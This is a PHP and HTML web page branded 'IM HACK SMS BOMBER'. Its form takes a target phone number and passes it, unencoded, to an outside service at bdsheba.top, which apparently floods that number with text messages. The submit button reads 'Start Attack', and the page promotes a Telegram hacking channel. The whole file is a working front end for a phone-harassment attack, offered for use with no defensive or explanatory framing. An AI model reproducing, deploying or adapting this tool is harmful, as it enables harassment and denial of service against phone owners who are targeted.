<?php
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["number"])) {
    // Get the number from the form input
    $number = $_POST["number"];
    
    // Your API URL
    $api_url = 'https://bdsheba.top/bio_main.php?number=' . $number;
    
    // Make a cURL request to the API
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $api_url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);
    
    // Handle the API response
    if ($response) {
        // Process the response as needed
        echo "API Response: " . $response;
    } else {
        echo "Error calling the API❤️https://t.me/imhack001.";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VIP Edit Number</title>
    <style>
        body {
    background-color: #000; 
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
}
        .container {
            width: 100%;
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h2 {
            text-align: center;
            color: #007bff;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #333;
            font-weight: bold;
        }
        .form-group input[type="text"] {
            width: calc(100% - 22px);
            padding: 10px;
            border: 1px solid #ced4da;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .form-group button {
            width: calc(100% - 22px);
            padding: 10px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s ease;
        }
        .form-group button:hover {
            background-color: #0056b3;
        }
        .vip {
            background-color: #ffcc00;
            color: #333;
            text-align: center;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="vip">
            <h3>Welcome VIP Sms Bomber!</h3>
            <p>You have access to im hack best bomber.</p>
        </div>
        <h2>IM HACK SMS BOMBER</h2>
        <form method="post" action="<?php echo $_SERVER["PHP_SELF"]; ?>">
            <div class="form-group">
                <label for="number"></label>
                <input type="text" id="number" name="number" placeholder="Enter your number">
            </div>
            <div class="form-group">
                <button type="submit">💣 𝚂𝚝𝚊𝚛𝚝 𝙰𝚝𝚝𝚊𝚌𝚔 💣</button>
            </div>
        </form>
    </div>
</body>
</html>
